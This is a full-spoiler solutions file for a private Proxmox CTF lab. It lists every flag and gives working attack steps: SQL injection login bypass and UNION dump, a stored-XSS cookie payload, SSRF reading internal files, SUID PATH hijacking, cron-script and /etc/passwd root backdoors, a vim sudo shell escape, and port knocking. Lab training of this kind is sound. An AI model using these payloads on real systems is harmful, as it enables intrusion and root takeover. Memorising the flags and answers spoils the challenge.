# Proxmox CTF Lab — Solutions

> **Full spoilers.** Every flag value and a working method for each. If you want the challenge, close this and use [README.md](README.md) instead. This is the answer key and the "I'm genuinely stuck" reference.

All flags follow `FLAG{...}`. Submit them at the scoreboard, `http://192.168.10.215/`.

**Flag summary (13 flags / 2500 points):**

| # | Target | Flag | Diff | Pts |
|---|---|---|---|---|
| 1 | 211 web | `FLAG{sql_1nj3ct10n_m4st3r_2024}` | Easy | 100 |
| 2 | 211 web | `FLAG{st0r3d_xss_c00k13_th13f}` | Medium | 200 |
| 3 | 211 web | `FLAG{ssrf_1nt3rn4l_s3rv1c3_pwn3d}` | Hard | 300 |
| 4 | 212 privesc | `FLAG{su1d_b1n4ry_3xpl01t_ez}` | Easy | 100 |
| 5 | 212 privesc | `FLAG{cr0n_j0b_wr1t4bl3_scr1pt}` | Medium | 200 |
| 6 | 212 privesc | `FLAG{sud0_m1sc0nf1g_v1m_sh3ll}` | Medium | 200 |
| 7 | 212 privesc | `FLAG{p4sswd_wr1t4bl3_r00t_4cc3ss}` | Hard | 300 |
| 8 | 213 forensics | `FLAG{b4s3_s1xty_f0ur_d3c0d3d}` | Easy | 100 |
| 9 | 213 forensics | `FLAG{h1dd3n_1n_pl41n_s1ght}` | Medium | 200 |
| 10 | 213 forensics | `FLAG{l0g_4n4lys1s_x0r_m4st3r}` | Hard | 300 |
| 11 | 214 network | `FLAG{4n0nym0us_ftp_l00t}` | Easy | 100 |
| 12 | 214 network | `FLAG{h1dd3n_p0rt_s3rv1c3}` | Medium | 200 |
| 13 | 214 network | `FLAG{p0rt_kn0ck_s3cr3t_d00r}` | Hard | 300 |

---

## CT 211 — Web Exploitation (`http://192.168.10.211/`)

The app is "MegaCorp." Home page links to a login form, a guestbook, and a URL-preview tool. `robots.txt` hints at an internal health check on `localhost:9999`.

### Flag 1 — SQL Injection (Easy) → `FLAG{sql_1nj3ct10n_m4st3r_2024}`

The login form builds its query with raw string formatting:
`SELECT * FROM users WHERE username='{}' AND password='{}'`.

Auth bypass:

```
username:  admin' --
password:  anything
```

That logs you in as `admin` (which also sets the XSS cookie, see Flag 2). The flag itself is the *password* of a seeded `flag_reader` user, so extract it with a UNION or boolean/error-based dump, e.g. in the username field:

```
' UNION SELECT 1,username,password,role FROM users --
```

The `flag_reader` row's password column is `FLAG{sql_1nj3ct10n_m4st3r_2024}`. (Seeded users: `admin:SuperSecretAdm1n!`, `user1:password123`, `jsmith:Welcome2024!`, `flag_reader:FLAG{...}`.)

### Flag 2 — Stored XSS / cookie theft (Medium) → `FLAG{st0r3d_xss_c00k13_th13f}`

The guestbook stores messages and renders them unescaped. When an admin session is active, the app sets a **non-HttpOnly** cookie `admin_token=FLAG{st0r3d_xss_c00k13_th13f}`. Post a script payload in the guestbook that reads `document.cookie`:

```html
<script>document.title=document.cookie</script>
```

Then load the page holding the admin session (from Flag 1's bypass) — `document.cookie` exposes `admin_token`, which is the flag. Because the cookie is not HttpOnly, JS can read it; that's the whole point. You can also just read the cookie directly in your browser's dev-tools after logging in as admin.

### Flag 3 — SSRF (Hard) → `FLAG{ssrf_1nt3rn4l_s3rv1c3_pwn3d}`

`/preview?url=` fetches whatever URL you give it with **no scheme or destination validation**, and it honours `file://`. Two ways in:

```
http://192.168.10.211/preview?url=http://localhost:9999/secret
http://192.168.10.211/preview?url=file:///etc/ctf_internal_flag.txt
```

Either returns `FLAG{ssrf_1nt3rn4l_s3rv1c3_pwn3d}`. The internal service on `127.0.0.1:9999` is only reachable from the server itself — the SSRF is what lets you reach it.

---

## CT 212 — Linux Privilege Escalation (`ssh ctfplayer@192.168.10.212`, pw `ctfplayer123`)

Four independent user→root paths. Start with the basics: `sudo -l`, `find / -perm -4000 -type f 2>/dev/null`, `ls -la /opt /etc/cron*`, `ls -la /etc/passwd`.

> **Red herrings:** `/usr/local/bin/sysinfo` and `/usr/local/bin/healthcheck` are SUID-root but harmless (no exploitable behaviour). Files under `/tmp` (`credentials.bak`, `.secret_notes.txt`, `.cache/session_token`) are decoys. Standard SUID binaries (`passwd`, `su`, etc.) are not the way in.

### Flag 4 — SUID binary / PATH hijack (Easy) → `FLAG{su1d_b1n4ry_3xpl01t_ez}`

`/usr/local/bin/statuscheck` is SUID root and calls `system("cat /var/log/status.log")` — `cat` with a **relative** path. Hijack `PATH`:

```bash
cd /tmp
printf '#!/bin/bash\ncat /root/flag1.txt\n' > cat    # or: /bin/bash to get a root shell
chmod +x cat
PATH=/tmp:$PATH /usr/local/bin/statuscheck
```

`statuscheck` runs your `cat` as root. Point it at `/root/flag1.txt` (`FLAG{su1d_b1n4ry_3xpl01t_ez}`) or spawn a root shell and read anything.

### Flag 5 — Writable cron script (Medium) → `FLAG{cr0n_j0b_wr1t4bl3_scr1pt}`

Root's crontab runs `/opt/scripts/backup.sh` every 2 minutes, and that script is **world-writable** (`-rwxrwxrwx`, root-owned). Append a payload and wait one cycle:

```bash
echo 'cat /root/flag2.txt > /tmp/f2; chmod 644 /tmp/f2' >> /opt/scripts/backup.sh
# wait up to 2 min
cat /tmp/f2
```

`FLAG{cr0n_j0b_wr1t4bl3_scr1pt}`. (Or copy `/bin/bash` to a SUID location from the cron job.)

### Flag 6 — Sudo misconfiguration / vim escape (Medium) → `FLAG{sud0_m1sc0nf1g_v1m_sh3ll}`

`sudo -l` shows `ctfplayer ALL=(root) NOPASSWD: /usr/bin/vim /var/log/app.log`. `vim` can shell out, so a vim you're allowed to run as root is a root shell (GTFOBins):

```bash
sudo /usr/bin/vim /var/log/app.log
# inside vim:
:!cat /root/flag3.txt
# or  :!/bin/bash  for a full root shell
```

`FLAG{sud0_m1sc0nf1g_v1m_sh3ll}`.

### Flag 7 — Writable /etc/passwd (Hard) → `FLAG{p4sswd_wr1t4bl3_r00t_4cc3ss}`

`/etc/passwd` is group-writable by `ctfplayer` (`-rw-rw-r-- root ctfplayer`). Add a root-equivalent user with a known password:

```bash
openssl passwd -1 -salt xx pass123        # -> $1$xx$...
# append a UID-0 entry, password hash in the passwd field (x -> the hash):
echo 'hacker:$1$xx$<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker    # password: pass123  -> root
cat /root/flag4.txt
```

`FLAG{p4sswd_wr1t4bl3_r00t_4cc3ss}`.

---

## CT 213 — Crypto & Forensics (`ssh analyst@192.168.10.213`, pw `analyst2024`)

Work the `~/evidence/` directory; `~/tools/` has helpers.

> **Red herrings:** `network_capture.pcap` (corrupted-data decoy), `confidential_backup.zip` (password `redherring`, decoy contents), `encrypted_data.b64` (decoy). Don't sink time into these.

### Flag 8 — Base64 chain (Easy) → `FLAG{b4s3_s1xty_f0ur_d3c0d3d}`

`~/evidence/encoded_message.txt` contains an intercepted-communication header followed by a base64 blob that has been **encoded three times**. Pull out the blob and decode it three times:

```bash
cd ~/evidence
# isolate the base64 body (the long token after the header text), then:
echo '<blob>' | base64 -d | base64 -d | base64 -d
```

The plaintext ends with `FLAG{b4s3_s1xty_f0ur_d3c0d3d}`. If a layer looks like more base64, keep going — three total.

### Flag 9 — Steganography (Medium) → `FLAG{h1dd3n_1n_pl41n_s1ght}`

`~/evidence/company_logo.png` has data appended **after the PNG `IEND` chunk** — a valid image that carries a trailer. Reveal it:

```bash
strings ~/evidence/company_logo.png | grep FLAG
# or inspect the tail:
xxd ~/evidence/company_logo.png | tail -20
```

`FLAG{h1dd3n_1n_pl41n_s1ght}`.

### Flag 10 — Log analysis + XOR (Hard) → `FLAG{l0g_4n4lys1s_x0r_m4st3r}`

`~/evidence/access.log` records an exfiltration. Method:

1. Find the suspicious client — IP `10.0.0.237`.
2. Its requests hit `/api/exfil?data=<hex>`; extract every `data=` hex chunk **in request order** and concatenate them.
3. The attacker's `User-Agent` carries the key: `Mozilla/5.0 (XOR-KEY: s3cr3t)` → key is `s3cr3t`.
4. Decrypt with the provided helper:

```bash
python3 ~/tools/xor_decrypt.py <concatenated-hex> s3cr3t
```

Output: `FLAG{l0g_4n4lys1s_x0r_m4st3r}`.

```bash
# extracting the chunks:
grep '10.0.0.237' ~/evidence/access.log | grep -oP '(?<=data=)[0-9a-fA-F]+' | tr -d '\n'
```

---

## CT 214 — Network Recon (`192.168.10.214`, no creds)

A single chain — each stage unlocks the next. Start with a full scan:

```bash
nmap -sV -p- 192.168.10.214
# open: 21 (FTP), 22 (SSH), 31337 (custom), and 2222 appears only after a knock
```

### Flag 11 — Anonymous FTP (Easy) → `FLAG{4n0nym0us_ftp_l00t}`

FTP allows anonymous login. Explore, including the hidden directory:

```bash
ftp 192.168.10.214        # user: anonymous, pass: anything
# get readme.txt, notes.txt, backup_old.tar.gz
# then look in pub/.hidden/
```

`pub/.hidden/credentials.txt` → `FLAG{4n0nym0us_ftp_l00t}`. Keep `notes.txt` (hints the knock sequence) and `backup_old.tar.gz` (holds the token for Flag 12).

### Flag 12 — Hidden service on 31337 (Medium) → `FLAG{h1dd3n_p0rt_s3rv1c3}`

Extract `backup_old.tar.gz` from FTP — inside is an auth token `MEGACORP-2024`. Connect to the debug console and authenticate:

```bash
tar xzf backup_old.tar.gz          # reveals AUTH_TOKEN = "MEGACORP-2024"
nc 192.168.10.214 31337
# at the prompt:
debug MEGACORP-2024
```

The console returns `FLAG{h1dd3n_p0rt_s3rv1c3}`. (Type `help` at the prompt to see commands.)

### Flag 13 — Port knocking + SSH backdoor (Hard) → `FLAG{p0rt_kn0ck_s3cr3t_d00r}`

`notes.txt` hints at a knock sequence "7-8-9 (thousands)." Knock `7000, 8000, 9000`, which opens SSH on **port 2222 for 30 seconds**, then log in as the backdoor user:

```bash
for p in 7000 8000 9000; do nmap -Pn --max-retries 0 -p $p 192.168.10.214; done
# (or: knock 192.168.10.214 7000 8000 9000)
ssh backdoor@192.168.10.214 -p 2222      # password: kn0ck_kn0ck
cat ~/flag.txt
```

`FLAG{p0rt_kn0ck_s3cr3t_d00r}`. Move quickly — the window is 30 seconds; re-knock if it closes. The open/close is handled by knockd inserting an iptables ACCEPT rule for your source IP (sequence `7000,8000,9000` to open, `9000,8000,7000` to close).

---

## Resetting after you've solved one

Reading this file spends a challenge. To try one cleanly again, re-arm just that box from the Proxmox host:

```bash
CTF_ASSUME_YES=1 bash /root/ctf/deploy.sh reset privesc
```

Flags are regenerated identically (they're fixed strings), but any changes you made — appended cron payloads, added passwd entries, opened knock windows — are wiped and the challenge is pristine again.
